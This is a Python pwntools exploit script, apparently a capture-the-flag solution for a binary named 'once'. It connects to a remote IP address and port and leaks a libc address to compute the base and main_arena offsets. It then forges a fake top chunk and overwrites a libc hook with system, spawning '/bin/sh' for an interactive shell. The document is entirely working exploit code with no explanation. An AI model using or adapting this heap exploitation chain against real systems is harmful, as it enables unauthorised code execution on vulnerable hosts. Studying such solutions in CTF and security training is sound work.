from pwn import *

env = {
	'LD_PRELOAD' : './libc-2.23.so'
}
#r = process("./once")#, env = env)
r = remote('47.75.189.102', 9999)

raw_input('?')

# leak addr
r.recvuntil("> ")
r.sendline('8')
r.recvuntil('Invalid choice\n0x')
puts = int(r.recv(12), 16)
log.info("puts: %#x" %puts)
base = puts - 0x6f690
log.info("base: %#x" %base)
main_arena = base + 0x3c4b20
log.info("main_arena: %#x" %main_arena)
addr_top_chunk = main_arena + 0x58
one_gadget = base + 0x45216 #rax = 0 
log.info("addr_top_chunk: %#x" %addr_top_chunk)
log.info("one_gadget: %#x" %one_gadget)
stdout = base + 0x3c5620
stdin = base + 0x3c48e0
system = base + 0x45390
log.info("system: %#x" %system)
#malloc


#fake top_chunk
r.recvuntil("> ")
r.sendline('2'+"\x00"*6)
payload = p64(0)
payload += p64(0x2001)
payload += p64(0)
payload += p64(addr_top_chunk-0x10) #next
r.send(payload)

r.recvuntil("> ")
r.sendline('1')

r.recvuntil("> ")
r.sendline('3')

#malloc in to bss
r.recvuntil("> ")
r.sendline('4')
r.recvuntil("> ")
r.sendline('1')
r.recvuntil('input size:\n')
r.sendline('300')

#overwrite malloc_hook
r.recvuntil("> ")
r.sendline('2'+"\x00"*6)
payload = "/bin/sh\x00"
payload += p64(main_arena+0x1c88) #free_hook #fake LAST_NOTE
payload += p64(stdout)
payload += p64(0)
payload += p64(stdin)
payload += p64(0)*2
r.send(payload)

r.recvuntil("> ")
r.sendline('4')
r.recvuntil("> ")
r.sendline('2'+"\x00"*6)
payload = p64(system)
r.send(payload)
#trigger one_gadget

r.recvuntil("> ")
r.sendline('4')
r.recvuntil("> ")
r.sendline('3')

r.interactive()